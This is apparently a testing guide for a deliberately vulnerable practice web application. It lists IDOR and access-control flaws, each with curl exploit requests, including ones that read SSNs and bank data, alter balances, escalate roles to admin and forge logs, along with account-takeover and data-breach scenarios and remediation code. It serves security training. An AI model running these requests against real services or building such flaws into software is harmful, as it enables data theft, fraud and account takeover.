# Security Testing Guide - IDOR & Access Control Vulnerabilities

This application contains **intentional security vulnerabilities** for testing purposes.

## Test Credentials

| Email | Password | Role | User ID |
|-------|----------|------|---------|
| admin@hooli-corp.org | password123 | admin | 1 |
| alice@example.com | password123 | user | 2 |
| bob@example.com | password123 | user | 3 |
| charlie@example.com | password123 | user | 4 |

## Vulnerability Catalog

### 1. IDOR - Document Access (Critical)

**Vulnerable Endpoint:** `GET /api/documents/{id}`

**Issue:** No ownership validation - any user can read/modify/delete any document

**Test:**
```bash
# Alice's private document (ID: 1)
curl https://api.hooli-corp.org/documents/1

# Bob can access Alice's document (IDOR)
curl https://api.hooli-corp.org/documents/1

# Charlie's sensitive document (ID: 5 - contains SSN)
curl https://api.hooli-corp.org/documents/5
```

**Secure Version:** `GET /api/documents/{id}/secure`

---

### 2. IDOR - Bank Account Access (Critical)

**Vulnerable Endpoint:** `GET /api/bank-accounts/{id}`

**Issue:** Exposes full bank account details including SSN and balance without authentication

**Test:**
```bash
# Alice's bank account
curl https://api.hooli-corp.org/bank-accounts/1

# Shows: account_number, balance, SSN
```

**Exploit:** Change account balance
```bash
curl -X PATCH https://api.hooli-corp.org/bank-accounts/1 \
  -H "Content-Type: application/json" \
  -d '{"balance": 999999.99}'
```

---

### 3. IDOR - Order Access (High)

**Vulnerable Endpoint:** `GET /api/orders/{id}/vulnerable`

**Issue:** Users can view other users' orders including shipping addresses

**Test:**
```bash
# View Alice's order
curl https://api.hooli-corp.org/orders/1/vulnerable

# Change order status
curl -X PATCH https://api.hooli-corp.org/orders/1/vulnerable \
  -H "Content-Type: application/json" \
  -d '{"status": "cancelled"}'
```

**Secure Version:** `GET /api/orders/{id}` (checks ownership)

---

### 4. Information Disclosure - User Enumeration (Medium)

**Vulnerable Endpoint:** `GET /api/users`

**Issue:** Lists all users without authentication

**Test:**
```bash
curl https://api.hooli-corp.org/users
```

**Shows:** All user IDs, emails, names, and roles

---

### 5. IDOR - User Profile Modification (High)

**Vulnerable Endpoint:** `GET/PATCH /api/users/{id}`

**Issue:** View and modify any user's profile without authentication

**Test:**
```bash
# View any user
curl https://api.hooli-corp.org/users/2

# Change Alice's email
curl -X PATCH https://api.hooli-corp.org/users/2 \
  -H "Content-Type: application/json" \
  -d '{"name": "Hacked", "email": "hacked@evil.com"}'
```

---

### 6. Privilege Escalation (Critical)

**Vulnerable Endpoint:** `POST /api/users/{id}`

**Issue:** Any user can change any user's role to admin

**Test:**
```bash
# Escalate user ID 2 (Alice) to admin
curl -X POST https://api.hooli-corp.org/users/2 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

### 7. Broken Access Control - Admin Logs (High)

**Vulnerable Endpoint:** `GET /api/admin/logs`

**Issue:** Admin-only logs accessible to anyone

**Test:**
```bash
# View admin logs without authentication
curl https://api.hooli-corp.org/admin/logs

# Create fake admin log
curl -X POST https://api.hooli-corp.org/admin/logs \
  -H "Content-Type: application/json" \
  -d '{"admin_id": 1, "action": "HACKED", "details": "System compromised"}'
```

**Secure Version:** `GET /api/admin/logs/secure`

---

## Testing Scenarios

### Scenario 1: Account Takeover via IDOR

1. List all users: `GET /api/users`
2. Pick a target user (e.g., ID 2 - Alice)
3. View their documents: `GET /api/documents/1`
4. Change their email: `PATCH /api/users/2`
5. View their bank account: `GET /api/bank-accounts/1`
6. Steal their money: `PATCH /api/bank-accounts/1` (increase your balance, decrease theirs)

### Scenario 2: Privilege Escalation

1. Create a regular user account
2. Use IDOR to change your role to admin: `POST /api/users/{your_id}`
3. Access admin logs: `GET /api/admin/logs`
4. Modify other users' data

### Scenario 3: Data Breach

1. Enumerate all users: `GET /api/users`
2. For each user ID, fetch:
   - Documents: `GET /api/documents/{id}`
   - Bank accounts: `GET /api/bank-accounts/{id}`
   - Orders: `GET /api/orders/{id}/vulnerable`
3. Exfiltrate all sensitive data

---

## Secure vs Vulnerable Endpoints

| Resource | Vulnerable | Secure | Status |
|----------|-----------|--------|--------|
| Documents | `/api/documents/{id}` | `/api/documents/{id}/secure` | ✅ |
| Orders | `/api/orders/{id}/vulnerable` | `/api/orders/{id}` | ✅ |
| Admin Logs | `/api/admin/logs` | `/api/admin/logs/secure` | ✅ |
| Bank Accounts | `/api/bank-accounts/{id}` | ❌ None | No secure version |
| Users | `/api/users/{id}` | ❌ None | No secure version |

---

## Remediation Guidelines

### Fix IDOR Vulnerabilities

1. **Always authenticate requests**
   ```typescript
   const user = await getCurrentUser();
   if (!user) return unauthorized();
   ```

2. **Check resource ownership**
   ```typescript
   if (resource.user_id !== user.id && user.role !== 'admin') {
     return forbidden();
   }
   ```

3. **Use parameterized queries**
   ```typescript
   // Good
   await pool.query('SELECT * FROM documents WHERE id = $1 AND user_id = $2', [id, userId]);

   // Bad
   await pool.query('SELECT * FROM documents WHERE id = ' + id);
   ```

4. **Implement role-based access control (RBAC)**
   ```typescript
   if (user.role !== 'admin') {
     return forbidden();
   }
   ```

5. **Never expose sequential IDs**
   - Use UUIDs instead of auto-increment integers
   - Or use random strings for resource IDs

---

## Tools for Testing

```bash
# Burp Suite - Intercept and modify requests
# OWASP ZAP - Automated vulnerability scanning
# Postman - Manual API testing

# curl examples
curl -X GET https://api.hooli-corp.org/users
curl -X GET https://api.hooli-corp.org/documents/1
curl -X GET https://api.hooli-corp.org/bank-accounts/1
```

---

**⚠️ WARNING:** This application is for **authorized security testing only**. Do not deploy to production or use these patterns in real applications.
